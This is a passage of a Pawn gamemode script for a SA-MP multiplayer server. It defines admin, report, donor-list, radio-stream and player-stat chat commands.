		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:weaps(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/weaps [playerid]");
    	new player1, string[128], string2[64], WeapName[24], slot, weap, ammo, wh, x;
		player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			format(string2,sizeof(string2),"[>> %s Weapons (id:%d) <<]", PlayerName2(player1), player1); SendClientMessage(playerid,blue,string2);
			for (slot = 0; slot < 14; slot++) {	GetPlayerWeaponData(player1, slot, weap, ammo); if( ammo != 0 && weap != 0) wh++; }
			if(wh < 1) return SendClientMessage(playerid,blue,"Player has no weapons");

			if(wh >= 1)
			{
				for (slot = 0; slot < 14; slot++)
				{
					GetPlayerWeaponData(player1, slot, weap, ammo);
					if( ammo != 0 && weap != 0)
					{
						GetWeaponName(weap, WeapName, sizeof(WeapName) );
						if(ammo == 65535 || ammo == 1) format(string,sizeof(string),"%s%s (1)",string, WeapName );
						else format(string,sizeof(string),"%s%s (%d)",string, WeapName, ammo );
						x++;
						if(x >= 5)
						{
						    SendClientMessage(playerid, blue, string);
						    x = 0;
							format(string, sizeof(string), "");
						}
						else format(string, sizeof(string), "%s,  ", string);
					}
			    }
				if(x <= 4 && x > 0) {
					string[strlen(string)-3] = '.';
				    SendClientMessage(playerid, blue, string);
				}
		    }
		    return 1;
		} else return SendClientMessage(playerid, red, "Player is not connected");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}


CMD:aka(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/aka [playerid]");
    	new player1, playername[MAX_PLAYER_NAME], str[128], tmp3[50];
		player1 = strval(params);
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
  		  	GetPlayerIp(player1,tmp3,50);
			GetPlayerName(player1, playername, sizeof(playername));
		    format(str,sizeof(str),"AKA: [%s id:%d] [%s] %s", playername, player1, tmp3, dini_Get("ladmin/config/aka.txt",tmp3) );
	        return SendClientMessage(playerid,blue,str);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:screen(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 4) {
	    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/screen [playerid] [text]");
    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
		player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
			GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
			CMDMessageToAdmins(playerid,"SCREEN");
			format(string,sizeof(string),"Administrator %s has sent you a screen message",adminname);	SendClientMessage(player1,blue,string);
			format(string,sizeof(string),"You have sent %s a screen message (%s)", playername, params[2]); SendClientMessage(playerid,blue,string);
			return GameTextForPlayer(player1, params[2],4000,3);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself or is the highest level admin");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:laston(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 2) {
    	new tmp2[256], file[256],player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], str[128];
		GetPlayerName(playerid, adminname, sizeof(adminname));

	    if(isnull(params)) {
			format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(adminname));
			if(!fexist(file)) return SendClientMessage(playerid, red, "JikyBot: File doesnt exist, player isnt registered");
			if(dUserINT(PlayerName2(playerid)).("LastOn")==0) {	format(str, sizeof(str),"Never"); tmp2 = str;
			} else { tmp2 = dini_Get(file,"LastOn"); }
			format(str, sizeof(str),"You were last on the server on %s",tmp2);
			return SendClientMessage(playerid, red, str);
		}
		player1 = strval(params);
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid) {
			CMDMessageToAdmins(playerid,"LASTON");
   	    	GetPlayerName(player1,playername,sizeof(playername)); format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(playername));
			if(!fexist(file)) return SendClientMessage(playerid, red, "JikyBot: File doesnt exist, player isnt registered");
			if(dUserINT(PlayerName2(player1)).("LastOn")==0) { format(str, sizeof(str),"Never"); tmp2 = str;
			} else { tmp2 = dini_Get(file,"LastOn"); }
			format(str, sizeof(str),"%s was last on the server on %s",playername,tmp2);
			return SendClientMessage(playerid, red, str);
		} else return SendClientMessage(playerid, red, "Player is not connected or is yourself");
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:aduty(playerid, params[]) return SendClientMessage(playerid, red,"Changed to /adminduty");
CMD:aoffduty(playerid, params[]) return SendClientMessage(playerid, red,"Changed to /adminduty");

CMD:adminduty(playerid,params[])
{
   if(PlayerInfo[playerid][Level] >= 2)
   {
       	if(AntiSK[playerid] == 0)
		{
         	if(PlayerInfo[playerid][OnDuty] == 0)
	 		{
 				PlayerInfo[playerid][OnDuty] = 1;
			    new str[128], AdminName[28];
		        GetPlayerName(playerid, AdminName, sizeof(AdminName));
		        format(str, sizeof(str), "Administrator %s is now on Admin duty!", AdminName);
		        SendClientMessageToAll(0xF600F6FF, str);
		        SetPlayerSkin(playerid,217);
		        SetPlayerTeam(playerid,6);
		        SetVehicleHealth(VID[playerid], 9999999999.0);
		//        Duty[playerid] = Create3DTextLabel("On Duty Admin\n!!Do Not Attack!!", 0xF600F6FF, 30.0, 40.0, 50.0, 40.0, 0);
		//        Attach3DTextLabelToPlayer(Duty[playerid], playerid, 0.0, 0.0, 0.5);
		   	    SetPlayerColor(playerid, 0xF600F6FF);
		        SetPlayerHealth(playerid, 100000000000.0);
		        SetPlayerArmour(playerid, 100000000000.0);
				ResetPlayerWeapons(playerid);
		        GivePlayerWeapon(playerid, 38,999999999);
		//        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		//        Update3DTextLabelText(DM[playerid], 0xFFFFFFFF, " ");
		        gTeam[playerid] = TEAM_MERC;
		        gClass[playerid] = CLASS;
         	}
  			else if(PlayerInfo[playerid][OnDuty] == 1)
			{
		        PlayerInfo[playerid][OnDuty] = 0;
		        new str[128], AdminName[28];
		        GetPlayerName(playerid, AdminName, sizeof(AdminName));
		        format(str, sizeof(str), "Administrator %s is now off Admin duty!", AdminName);
		        SendClientMessageToAll(0xFD01FDAA, str);
		        SetPlayerHealth(playerid, 0);
		//        Delete3DTextLabel(Duty[playerid]);
		//        Update3DTextLabelText(RankLabel[playerid], 0xFFFFFFFF, " ");
		//        Update3DTextLabelText(Duty[playerid], 0xFFFFFFFF, " ");
				ForceClassSelection(playerid);
			    SetPlayerHealth(playerid, 0);
			    SetPlayerArmour(playerid, 0);
		        new rand = random(sizeof(PlayerColors));
		        SetPlayerColor(playerid, PlayerColors[rand]);
            }
		}
		else SendClientMessage(playerid,red,"You can't go when under Anti Spawn Kill");
   	}
   	else return 0;
   	return 1;
}
//+++++++++++++++++++++++++++++++++++++new radio updated===========================
CMD:radiostart(playerid, params[])
{
   new radiolink[100];
   if(sscanf(params,"s[100]", radiolink)) return SendClientMessage(playerid, 0xFFFFFFFF,"use /radiostart [1 - 5]");
   if(strfind(radiolink, "1", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"You're listening to Boom Station");
      PlayAudioStreamForPlayer(playerid,"http://yp.shoutcast.com/sbin/tunein-station.pls?id=245273");
   }
   else if(strfind(radiolink, "2", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"SEREBRO_-_Mi_Mi_Mi");
      PlayAudioStreamForPlayer(playerid,"http://k007.kiwi6.com/hotlink/k46g8ah6af/SEREBRO_-_Mi_Mi_Mi_Official_Video_.mp3");
   }
   else if(strfind(radiolink, "3", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Pitbull_-_Rain_Over_Me_ft._Marc_Anthony");
      PlayAudioStreamForPlayer(playerid,"http://k007.kiwi6.com/hotlink/lc16zevshj/Pitbull_-_Rain_Over_Me_ft._Marc_Anthony.mp3");
   }
   else if(strfind(radiolink, "4", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Eminem_-_Not_Afraid");
	  PlayAudioStreamForPlayer(playerid,"http://k007.kiwi6.com/hotlink/vs6i94d02d/Eminem_-_Not_Afraid_-_720p.mp3");
   }
   else if(strfind(radiolink, "5", true) != -1)
   {
      SendClientMessage(playerid,0xFFFF00C8,"Eminem_ft_Tupac_50_Cent_and_Nate_Dogg_Till_I_Collapse_remix");
      PlayAudioStreamForPlayer(playerid,"http://k007.kiwi6.com/hotlink/wne6csjyl7/Eminem_ft_Tupac_50_Cent_and_Nate_Dogg_Till_I_Collapse_remix_-_360p.mp3");
   }
   return 1;
}


CMD:radiohelp(playerid,params[])
{
 	SendClientMessage(playerid,green,"/Radiostart[1-2] -> Turn on Radio.");
 	SendClientMessage(playerid,green,"/Radiostop -> Turn off Radio.");
   return 1;
}
CMD:radiostop(playerid,params[])
{
	StopAudioStreamForPlayer(playerid);
   return 1;
}
CMD:admins(playerid, params[])
{
    #pragma unused params
    new
        count = 0,
        string[800],
        AdmRank[500];

    foreach(Player, i)
    {
        //if (IsPlayerConnected(i))
        //{
            if(PlayerInfo[i][Level] >= 1 && PlayerInfo[i][Hide] == 0)
            {
                if(IsPlayerAdmin(i)) AdmRank ="{F3FF02}[RCON ADMIN!]";
                else
                {
                    switch(PlayerInfo[i][Level])
                    {
                        case 1: AdmRank = "{FFD700}[Moderator]";
                        case 2: AdmRank = "{FF4500}[Junior Admin]";
                        case 3: AdmRank = "{1E90FF}[Senior Admin]";
                        case 4: AdmRank = "{0000CD}[Lead Admin]";
                        case 5: AdmRank = "{00FF00}[Head Admin]";
                        case 6: AdmRank = "{4B0082}[Server Manager]";
                        case 7: AdmRank = "{F08080}[Global Admin]";
                        case 8: AdmRank = "{FF1493}[Community Manager]";
                        case 9: AdmRank = "{800000}[Community Co-Owner]";
                        case 10: AdmRank = "{FF0000}[Community Owner]";
                    }
                    new nameee[128];
                    GetPlayerName(i, nameee, 16);
                    if(!strcmp(nameee, "[XP]IzZaN", true))
                    GetPlayerName(i, nameee, 16);
                    if(!strcmp(nameee, "Admin", true))
                    GetPlayerName(i, nameee, 16);
                    if(!strcmp(nameee, "Perfect_Boy", true))
                    {
                      AdmRank = "{B22222}[Community Owner And Scripter]";
                    }
                }
                format(string, 500, ""cred"%s{F81414}%s [ID:%i] | Level: %d - %s\n\n", string, PlayerName2(i), i, PlayerInfo[i][Level], AdmRank);
                //We are appending the string, so put %s before any new data is added,
                //and that parameter actually refers to the string itself.
                count++;
            }
        //}
    }
    if (count == 0) ShowPlayerDialog(playerid, 800, DIALOG_STYLE_MSGBOX, "{F81414}RWW2 - Online Admins :", "{00FFEE}No Admins Are Online in Server\n\n{00FF00}COD - RWW2 ", "Close", "");
    else ShowPlayerDialog(playerid, 800, DIALOG_STYLE_MSGBOX, "{F81414}RWW2 - Online Admins :", string, "Close", "");
    //Don't show dialog in a loop, it won't show all the admins continuously.
    //Show it after all the data are ready.
	return 1;
}
CMD:sendmsg(playerid,params[]) //fix sendmsg cmd added, so that admins don't need to copy-paste msg's
{
    if(PlayerInfo[playerid][Level] >= 1)
	{
	    new choice;
        if(sscanf(params,"d",choice))
		{
			SendClientMessage(playerid, red, "/sendmsg [1-7]");
			SendClientMessage(playerid, red, "1 - /report, 2 - /helpme, 3 - unban app, 4 - forum, 5 - don't ask for score/cash, 6 - how to earn stuff, 7 - event");
            SendClientMessage(playerid, red, "Spamming with this command will lead to punishment!");
			return 0;
		}
		switch(choice)
		{
			case 1:
			SendClientMessageToAll(red,"[MESSAGE]If you see a hacker or a rule-breaker please use /report [id] [reason]");
            case 2:
			SendClientMessageToAll(red,"[MESSAGE]If you need any help or have a question please use /helpme [question]");
            case 3:
			SendClientMessageToAll(red,"[MESSAGE]If you are banned, please make an unban application at xenon-extreme.com forum");
			case 4:
			SendClientMessageToAll(red,"[MESSAGE]You can also visit our forums: xenon-extreme.com");
			case 5:
			SendClientMessageToAll(red,"[MESSAGE]Please do not ask for score/cash in main chat, it may get you warned or even muted!");
            case 6:
			SendClientMessageToAll(red,"[MESSAGE]To earn score and cash, kill enemy players, capture zones, destroy objects on enemy bases");
			case 7:
			SendClientMessageToAll(red,"[MESSAGE]An event is running at the moment, write /join to join it and have fun :)");
		}
	}
	else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	return 1;
}
CMD:sm(playerid, params[])
{
	return cmd_sendmsg(playerid, params);
}
CMD:donors(playerid, params[])
{
    #pragma unused params
    new
        count = 0,
        string[800];
    foreach(Player, i)
    {
        //if (IsPlayerConnected(i))
        //{
            if(PlayerInfo[i][dRank] >= 1)
            {
                format(string, 500, "%s %s [ID:%i] | DonorLevel: %d\n", string, PlayerName2(i), i, PlayerInfo[i][dRank]);
                //We are appending the string, so put %s before any new data is added,
                //and that parameter actually refers to the string itself.
                count++;
            }
        //}
	}
    if (count == 0) ShowPlayerDialog(playerid, 800, DIALOG_STYLE_MSGBOX, "{F81414}=Online Donators=", "{00FFEE}No Donators Online\n{00FF00}_____", "Close", "");
    else ShowPlayerDialog(playerid, 800, DIALOG_STYLE_MSGBOX, "{F81414}=Online Donators=", string, "Close", "");
    return 1;
}
CMD:sdonors(playerid, params[])
{
    #pragma unused params
    new count = 0, string[800];
    foreach(Player, i)
    {
        //if (IsPlayerConnected(i))
        //{
            if(PlayerInfo[i][dRank] >= 5)
            {
                format(string, 500, "%s %s [ID:%i] | Special DonorLevel: %d\n", string, PlayerName2(i), i, PlayerInfo[i][dRank]);
                //We are appending the string, so put %s before any new data is added,
                //and that parameter actually refers to the string itself.
                count++;
            }
        //}
	}
    if (count == 0) ShowPlayerDialog(playerid, 800, DIALOG_STYLE_MSGBOX, "{F81414}=Online Special Donators=", "{00FFEE}No Special Donators Online\n{00FF00}_____", "Close", "");
    else ShowPlayerDialog(playerid, 800, DIALOG_STYLE_MSGBOX, "{F81414}=Online Special Donators=", string, "Close", "");
    return 1;
}
CMD:testers(playerid,params[])
{
    #pragma unused params
    new
        count = 0,
        string[500];
    foreach(Player, i)
    {
     //   if (IsPlayerConnected(i))
       // {
            if(PlayerInfo[i][Helper] == 1)
            {
                format(string, 500, "%s{F3FF02}%s [id :%d] | Server Tester\n", string, PlayerName2(i),i );
                //We are appending the string, so put %s before any new data is added,
                //and that parameter actually refers to the string itself.
                count++;
            }
        //}
    }
    if (count == 0) ShowPlayerDialog(playerid, 500, DIALOG_STYLE_MSGBOX, "{F81414} Online Server Testers", "{00FFEE}No Server Testers!\n{F81414}______________", "Close", "");
    else ShowPlayerDialog(playerid, 500, DIALOG_STYLE_MSGBOX, "{F81414}Online Server Testers", string, "Close", "");
    //Don't show dialog in a loop, it won't show all the admins continuously.
    //Show it after all the data are ready.
    return 1;
}
CMD:morning(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 1) {
        CMDMessageToAdmins(playerid,"MORNING");
        return SetPlayerTime(playerid,7,0);
    } else return SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
}

CMD:adminarea0(playerid,params[]) {
	#pragma unused params
    if(PlayerInfo[playerid][Level] >= 3) {
        CMDMessageToAdmins(playerid,"ADMINAREA");
	    SetPlayerPos(playerid, AdminArea[0], AdminArea[1], AdminArea[2]);
	    SetPlayerFacingAngle(playerid, AdminArea[3]);
	    SetPlayerInterior(playerid, AdminArea[4]);
		SetPlayerVirtualWorld(playerid, AdminArea[5]);
		return GameTextForPlayer(playerid,"Welcome Admin %s",1000,3);
	} else {
	   	SetPlayerHealth(playerid,1.0);
   		new string[100]; format(string, sizeof(string),"%s has used adminarea (non admin)", PlayerName2(playerid) );
	   	MessageToAdmins(red,string);
	} return SendClientMessage(playerid,red, "JikyBot: You must be an administrator to use this command.");
}


CMD:setlevel(playerid,params[]) {
		if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setlevel [playerid] [level]");
	    	new player1, level, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);
			if(isnull(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/setlevel [playerid] [level]");
			level = strval(tmp2);

			if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(Logged[player1] == 1) {
					if(level > 10 ) return SendClientMessage(playerid,red,"JikyBot: Incorrect Level");
					if(level == PlayerInfo[player1][Level]) return SendClientMessage(playerid,red,"JikyBot: Player is already this level");
	       			CMDMessageToAdmins(playerid,"SETLEVEL");
					GetPlayerName(player1, playername, sizeof(playername));	GetPlayerName(playerid, adminname, sizeof(adminname));
			       	new year,month,day;   getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);

					if(level > 0) format(string,sizeof(string),"Administrator %s has set you to Administrator Status [level %d]",adminname, level);
					else format(string,sizeof(string),"Administrator %s has set you to Player Status [level %d]",adminname, level);
					SendClientMessage(player1,blue,string);

					if(level > PlayerInfo[player1][Level]) GameTextForPlayer(player1,"~g~Promoted", 2000, 3);
					else GameTextForPlayer(player1,"~r~Demoted", 2000, 3);

					format(string,sizeof(string),"You have made %s Level %d on %d/%d/%d at %d:%d:%d", playername, level, day, month, year, hour, minute, second); SendClientMessage(playerid,blue,string);
					format(string,sizeof(string),"Administrator %s has made %s Level %d on %d/%d/%d at %d:%d:%d",adminname, playername, level, day, month, year, hour, minute, second);
					SaveToFile("AdminLog",string);
					new query[200]; //Creates the variables
  					format(query, sizeof(query), "UPDATE Accounts SET Level=%d WHERE Name='%s'", PlayerInfo[playerid][Level], playername);
					dUserSetINT(PlayerName2(player1)).("level",(level));
					PlayerInfo[player1][Level] = level;
					TempAdmin[player1] = level;
					return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				} else return SendClientMessage(playerid,red,"JikyBot: Player must be registered and logged in to be admin");
			} else return SendClientMessage(playerid, red, "Player is not connected");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:settemplevel(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 8 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "JikyBot: Usage:/settemplevel [playerid] [level]");
	    	new player1, level, string[128];
			player1 = strval(tmp);
			level = strval(tmp2);

			if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				if(Logged[player1] == 1) {
					if(level > 5 ) return SendClientMessage(playerid,red,"JikyBot: Incorrect Level");
					if(level == PlayerInfo[player1][Level]) return SendClientMessage(playerid,red,"JikyBot: Player is already this level");
	       			CMDMessageToAdmins(playerid,"SETTEMPLEVEL");
			       	new year,month,day; getdate(year, month, day); new hour,minute,second; gettime(hour,minute,second);

					if(level > 0) format(string,sizeof(string),"Administrator %s has temporarily set you to Administrator Status [level %d]", pName(playerid), level);
					else format(string,sizeof(string),"Administrator %s has temporarily set you to Player Status [level %d]", pName(playerid), level);
					SendClientMessage(player1,blue,string);

					if(level > PlayerInfo[player1][Level]) GameTextForPlayer(player1,"Promoted", 2000, 3);
					else GameTextForPlayer(player1,"Demoted", 2000, 3);

					format(string,sizeof(string),"You have made %s Level %d on %d/%d/%d at %d:%d:%d", pName(player1), level, day, month, year, hour, minute, second); SendClientMessage(playerid,blue,string);
					format(string,sizeof(string),"Administrator %s has made %s temp Level %d on %d/%d/%d at %d:%d:%d",pName(playerid), pName(player1), level, day, month, year, hour, minute, second);
					SaveToFile("TempAdminLog",string);
					PlayerInfo[player1][Level] = level;
					return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
				} else return SendClientMessage(playerid,red,"JikyBot: Player must be registered and logged in to be admin");
			} else return SendClientMessage(playerid, red, "Player is not connected");
		} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
	} else return SendClientMessage(playerid,red,"JikyBot: You must be logged in to use this commands");
}

CMD:report(playerid,params[]) {
    new reported, tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
    if(isnull(params)) return SendClientMessage(playerid, red, "JikyBot: Usage:/report [playerid] [reason]");
	reported = strval(tmp);

 	if(IsPlayerConnected(reported) && reported != INVALID_PLAYER_ID) {
		if(PlayerInfo[reported][Level] == ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"JikyBot: You cannot report this administrator");
		if(playerid == reported) return SendClientMessage(playerid,red,"JikyBot: You Cannot report yourself");
		if(strlen(params) > 3) {
			new reportedname[MAX_PLAYER_NAME], reporter[MAX_PLAYER_NAME], str[128], hour,minute,second; gettime(hour,minute,second);
			GetPlayerName(reported, reportedname, sizeof(reportedname));	GetPlayerName(playerid, reporter, sizeof(reporter));
			format(str, sizeof(str), "{00FF00}||NewReport||  %s(%d) reported %s(%d) Reason: %s |@%d:%d:%d|", reporter,playerid, reportedname, reported, params[strlen(tmp)+1], hour,minute,second);
			MessageToTwice(red,str);
			SaveToFile("ReportLog",str);
			format(str, sizeof(str), "Report(%d:%d:%d): %s(%d) reported %s(%d) Reason: %s", hour,minute,second, reporter,playerid, reportedname, reported, params[strlen(tmp)+1]);
			for(new i = 1; i < MAX_REPORTS-1; i++) Reports[i] = Reports[i+1];
			Reports[MAX_REPORTS-1] = str;
			return SendClientMessage(playerid,yellow, "Your report has been sent to online administrators.");
		} else return SendClientMessage(playerid,red,"JikyBot: Must be a valid reason");
	} else return SendClientMessage(playerid, red, "Player is not connected");
}


CMD:reports(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 1 || PlayerInfo[playerid][Helper] == 1) {
        new ReportCount;
		for(new i = 1; i < MAX_REPORTS; i++)
		{
			if(strcmp( Reports[i], "<none>", true) != 0) { ReportCount++; SendClientMessage(playerid,COLOR_WHITE,Reports[i]); }
		}
		if(ReportCount == 0) SendClientMessage(playerid,COLOR_WHITE,"There have been no reports");
    } else SendClientMessage(playerid,red,"JikyBot: You need to be level 1/Server Tester to use this command");
	return 1;
}

CMD:banlist(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 1) {
        new BansCount;
		for(new i = 1; i < MAX_BANS; i++)
		{
			if(strcmp( Bans[i], "<none>", true) != 0) { BansCount++; SendClientMessage(playerid,COLOR_WHITE,Bans[i]); }
		}
		if(BansCount == 0) SendClientMessage(playerid,COLOR_WHITE,"There have been no bans today!");
    } else SendClientMessage(playerid,red,"JikyBot: You need to be level 1 to use this command");
	return 1;
}

CMD:richlist(playerid,params[]) {
    #pragma unused params
 		new string[128], Slot1 = -1, Slot2 = -1, Slot3 = -1, Slot4 = -1, HighestCash = -9999;
 		SendClientMessage(playerid,COLOR_WHITE,"Rich List:");
		foreach(Player, x)
		{
			if (IsPlayerConnected(x)) if (GetPlayerMoney(x) >= HighestCash)
			{
				HighestCash = GetPlayerMoney(x);
				Slot1 = x;
			}
		}
		HighestCash = -9999;
		foreach(Player, x)
		{
			if (IsPlayerConnected(x) && x != Slot1) if (GetPlayerMoney(x) >= HighestCash)
			{
				HighestCash = GetPlayerMoney(x);
				Slot2 = x;
			}
		}
		HighestCash = -9999;
		foreach(Player, x)
		{
			if (IsPlayerConnected(x) && x != Slot1 && x != Slot2) if (GetPlayerMoney(x) >= HighestCash)
			{
				HighestCash = GetPlayerMoney(x);
				Slot3 = x;
			}
		}
		HighestCash = -9999;
		foreach(Player, x) {
			if (IsPlayerConnected(x) && x != Slot1 && x != Slot2 && x != Slot3) if (GetPlayerMoney(x) >= HighestCash)
			{
				HighestCash = GetPlayerMoney(x);
				Slot4 = x;
			}
		}
		    format(string, sizeof(string), "(%d) %s - $%d - %d", Slot1,PlayerName2(Slot1),GetPlayerMoney(Slot1),GetPlayerScore(Slot1) );
		    SendClientMessage(playerid,COLOR_WHITE,string);
		if(Slot2 != -1)	{
			format(string, sizeof(string), "(%d) %s - $%d - %d", Slot2,PlayerName2(Slot2),GetPlayerMoney(Slot2),GetPlayerScore(Slot2) );
			SendClientMessage(playerid,COLOR_WHITE,string);
		}
		if(Slot3 != -1)	{
			format(string, sizeof(string), "(%d) %s - $%d - %d", Slot3,PlayerName2(Slot3),GetPlayerMoney(Slot3),GetPlayerScore(Slot3) );
			SendClientMessage(playerid,COLOR_WHITE,string);
		}
		if(Slot4 != -1)	{
			format(string, sizeof(string), "(%d) %s - $%d - %d", Slot4,PlayerName2(Slot4),GetPlayerMoney(Slot4),GetPlayerScore(Slot4) );
			SendClientMessage(playerid,COLOR_WHITE,string);
		}
		return 1;
}
CMD:miniguns(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 4) {
		new bool:First2 = false, carty, string[128], i, slot, weap, ammo;
		for(i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				for(slot = 0; slot < 14; slot++) {
					GetPlayerWeaponData(i, slot, weap, ammo);
					if(ammo != 0 && weap == 38) {
					    carty++;
						if(!First2) { format(string, sizeof(string), "Minigun: (%d)%s(ammo%d)", i, PlayerName2(i), ammo); First2 = true; }
				        else format(string,sizeof(string),"%s, (%d)%s(ammo%d) ",string, i, PlayerName2(i), ammo);
					}
				}
    	    }
		}
		if(carty == 0) return SendClientMessage(playerid,COLOR_WHITE,"No players have a minigun"); else return SendClientMessage(playerid,COLOR_WHITE,string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}
CMD:hseeks(playerid,params[]) {
    #pragma unused params
    if(PlayerInfo[playerid][Level] >= 4) {
		new bool:First2 = false, carty, string[128], i, slot, weap, ammo;
		for(i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				for(slot = 0; slot < 14; slot++) {
					GetPlayerWeaponData(i, slot, weap, ammo);
					if(ammo != 0 && weap == 36) {
					    carty++;
						if(!First2) { format(string, sizeof(string), "Heat Seeker: (%d)%s(ammo%d)", i, PlayerName2(i), ammo); First2 = true; }
				        else format(string,sizeof(string),"%s, (%d)%s(ammo%d) ",string, i, PlayerName2(i), ammo);
					}
				}
    	    }
		}
		if(carty == 0) return SendClientMessage(playerid,COLOR_WHITE,"No players have a heat seeker"); else return SendClientMessage(playerid,COLOR_WHITE,string);
	} else return SendClientMessage(playerid,red,"[LEVEL-INFO]:Invalid command! use /commands or /cmds to check full list.");
}

CMD:saveallstats(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 5) {
		CMDMessageToAdmins(playerid,"SAVEALLSTATS");
	   	foreach(Player, i)
  		{
			if(IsPlayerConnected(i))
			{
				PlayerPlaySound(i,1057,0.0,0.0,0.0);
		    	SavePlayer(i);
			}
		}
		new string[128]; format(string,sizeof(string),"Administrator \"%s\" has saved all players stats", pName(playerid) );
		return SendClientMessageToAll(C_PINK, string);
	} else return SendClientMessage(playerid,red,"JikyBot: You need to be level 5 to use this command");
}
CMD:giveallmask(playerid,params[]) {
#pragma unused params
if(PlayerInfo[playerid][Level] >= 6) {
  if(PlayerInfo[playerid][Registered] == 1) {
 	if(PlayerInfo[playerid][LoggedIn] == 1) {
 	foreach(Player, i)
    {
   	   SendClientMessage(i, yellow, "Mask Received!");
   	   PlayerPlaySound(i, 1057,0.0,0.0,0.0);
	   }
	   new string[128];
	   format(string,128,"Administrator \"%s\" has Given All Player Mask",pName(playerid));
       SendClientMessageToAll(C_PINK, string);
       }
    }
  } else return SendClientMessage(playerid,red,"JikyBot: You need to be level 6 to use this command");
 return 1;
}
CMD:apm(playerid, params[])
{
   new str[128], str2[128], id, adminstr[128];
   if(sscanf(params,"ds[128]", id, str2)) return SendClientMessage(playerid, red,"JikyBot: Usage:/apm [id] [message]");
   if(IsPlayerConnected(id))
   {
	   if(id != playerid)
	   {

              if(PlayerInfo[playerid][Level] >= 3)
			  {
		   		format(str, sizeof(str),"Admin PM to [%d]%s: %s", id, PlayerName2(id), str2);
		   		SendClientMessage(playerid, yellow, str);
		   		format(str, sizeof(str),"Admin PM [%d]%s: %s",playerid, PlayerName2(playerid), str2);
		   		SendClientMessage(id, COLOR_PINK, str);
		   		PlayerPlaySound(id,1085,0.0,0.0,0.0);
		   		MessageTo4(grey, adminstr);
		   		}
		   else return SendClientMessage(playerid, red,"You are not a high enough level to use this command");
	   }
	   else return SendClientMessage(playerid, red,"You cannot PM yourself");
   }
   else return SendClientMessage(playerid, red,"Player is not connected");
   return 1;
}
CMD:sdcmds(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][dRank] == 5)
	{
